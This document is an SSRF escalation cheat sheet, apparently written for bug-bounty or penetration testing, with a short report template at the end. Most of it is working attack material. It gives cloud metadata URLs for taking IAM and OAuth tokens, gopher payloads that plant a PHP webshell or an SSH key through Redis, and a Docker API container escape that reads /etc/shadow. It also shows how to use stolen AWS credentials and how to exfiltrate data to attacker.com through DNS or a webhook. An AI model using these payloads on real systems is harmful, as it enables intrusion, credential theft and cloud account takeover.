# SSRF Escalation

You have SSRF. Now maximize impact.

## Cloud Metadata

### AWS IMDSv1

```bash
# Instance info
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# IAM credentials (JACKPOT)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# Identity document
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Impact:** IAM credentials → AWS account compromise

### AWS IMDSv2 (Harder)

Requires header: `X-aws-ec2-metadata-token`

```bash
# First, get token (requires PUT with header)
# Usually blocked by SSRF

# If you can set headers:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

### GCP

```bash
# Requires header: Metadata-Flavor: Google

http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id

# Alternative
http://metadata.google.internal/computeMetadata/v1/
```

### Azure

```bash
# Requires header: Metadata: true

http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
```

### DigitalOcean

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

### Kubernetes

```bash
# Service account token
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Kubernetes API (if accessible)
https://kubernetes.default.svc/api/
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
```

## Internal Services RCE

### Redis → RCE

If Redis is accessible without auth:

```bash
# Write webshell
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Write SSH key
gopher://127.0.0.1:6379/_SET%20ssh%20%22%5Cn%5Cnssh-rsa%20AAAA...%20user%40host%5Cn%5Cn%22%0D%0ACONFIG%20SET%20dir%20%2Froot%2F.ssh%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASAVE%0D%0A
```

### Memcached → Cache Poisoning

```bash
# Set arbitrary cache value
dict://127.0.0.1:11211/set%20key%200%20600%205%0D%0Avalue%0D%0A
```

### Docker API → Container Escape

```bash
# List containers
http://127.0.0.1:2375/containers/json

# Create malicious container with host mount
POST http://127.0.0.1:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow > /tmp/shadow"],
  "Binds": ["/:/host"]
}
```

### FastCGI → RCE

```bash
# Use gopherus to generate payload
python gopherus.py --exploit fastcgi /var/www/html/index.php

# Payload executes PHP code via FastCGI
```

### Internal Admin Panels

```bash
# Jenkins
http://127.0.0.1:8080/script

# Tomcat Manager
http://127.0.0.1:8080/manager/html

# Solr
http://127.0.0.1:8983/solr/admin/cores

# Zabbix
http://127.0.0.1/zabbix/

# Kibana
http://127.0.0.1:5601/
```

## Chaining SSRF

### SSRF → AWS Takeover

1. SSRF to metadata endpoint
2. Retrieve IAM credentials
3. Use AWS CLI with stolen creds
4. Enumerate permissions, escalate

```bash
# Use stolen creds
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

### SSRF → Internal App Takeover

1. SSRF to internal admin panel
2. Find auth bypass or default creds
3. Create admin user or extract data

### Blind SSRF → Data Exfil

If you can only trigger requests but not see responses:

```bash
# DNS exfiltration
?url=http://$(whoami).attacker.com

# Via webhook
?url=http://attacker.com/log?data=INTERNAL_DATA
```

## Impact Examples

| Scenario | Severity |
|----------|----------|
| Blind SSRF, external only | Low |
| Port scan internal network | Medium |
| Read internal services | Medium-High |
| Access cloud metadata | High |
| Retrieve IAM credentials | Critical |
| RCE via internal service | Critical |

---

## PoC Template

```markdown
## Summary
SSRF in [endpoint] allows access to internal services and AWS metadata.

## Steps
1. Send request to vulnerable endpoint
2. Change URL parameter to internal target
3. Observe response with internal data

## Impact
Attacker can:
- Access AWS IAM credentials
- Read internal configuration
- [Specific impact based on what you found]

## Proof
[Screenshot of metadata/internal response]
```
